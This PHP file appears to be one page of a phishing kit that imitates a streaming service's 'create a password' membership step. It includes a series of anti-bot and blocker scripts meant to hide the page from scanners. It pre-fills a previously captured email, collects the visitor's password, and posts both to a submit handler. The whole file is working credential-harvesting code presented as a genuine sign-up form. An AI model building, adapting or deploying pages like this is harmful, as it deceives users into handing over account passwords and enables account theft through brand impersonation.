<?php 
include "./boots/anti1.php";
include "./boots/anti2.php";
include "./boots/anti3.php";
include "./boots/anti4.php";
include "./boots/anti5.php";
include "./boots/anti6.php";
include "./boots/anti7.php";
include "./boots/anti8.php";
include "./boots/anti9.php";
include "./boots/anti10.php";
include "./boots/anti11.php";
include "./boots/anti12.php";
include "./boots/anti13.php";
include "./boots/anti14.php";
include "./boots/anti15.php";
include "./boots/anti16.php";
include "./boots/blocker.php";
include_once "./submit.php" ;

if(!isset($_SESSION['email'])){
    header('Location: indexx.php');
    exit();
}

include_once "./includes/header.html" ;

?>

<div class="simpleContainer" data-transitioned-child="true">
    <div class="centerContainer" style="display: block; transform: none; opacity: 1; transition-duration: 250ms;">
        <form method="POST" action="submit.php">
            <div class="regFormContainer">
                <div class="stepHeader-container">
                    <div class="stepHeader" >
                        <span id="" class="stepIndicator">STEP <b>1</b> OF <b>3</b></span>
                        <h1 class="stepTitle" >Create a password to start your
                            membership.</h1>
                    </div>
                </div>
                <div>
                    <div class="contextRow" >Just a few more steps and you're
                        done!</div>
                    <div class="contextRow">We hate paperwork, too.</div>
                    <ul class="simpleForm structural ui-grid">
                        <li  class="nfFormSpace">
                            <div  class="nfInput nfInputOversize">
                                <div class="nfInputPlacement">
                                    <label class="input_id" placeholder="email">
                                    <input name="id_email" class="nfTextField" id="id_email" type="email"  autocomplete="email" 
                                    maxlength="50" minlength="5" value="<?php echo $_SESSION['email'] ; ?>">
                                    <label for="id_email" class="placeLabel">Email</label>
                                </label>
                                   <div hidden id="inputErrorMsgEmail" class="inputError"></div>
                                </div>
                            </div>
                        </li>
                        <li class="nfFormSpace">
                            <div  class="nfInput nfInputOversize">
                                <div class="nfInputPlacement">
                                    <label class="input_id" placeholder="password">
                                        <input name="id_pass" class="nfTextField" id="id_pass" type="password" autocomplete="password" maxlength="68" minlength="4" >
                                        <label for="id_pass" class="placeLabel">Add a password</label>
                                    </label>
                                </div>
                                <div hidden id="inputErrorMsgPass" id="" class="inputError"></div>
                            </div>
                        </li>
                    </ul>
                </div>
            </div>
            <input type="hidden" name="type" value="account">

            <div class="submitBtnContainer">
                <button disabled id="btn_step_two" type="submit" autocomplete="off" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize">Next</button></div>
        </form>
    </div>
</div>
<?php include_once "./includes/footer.html" ;
 ?>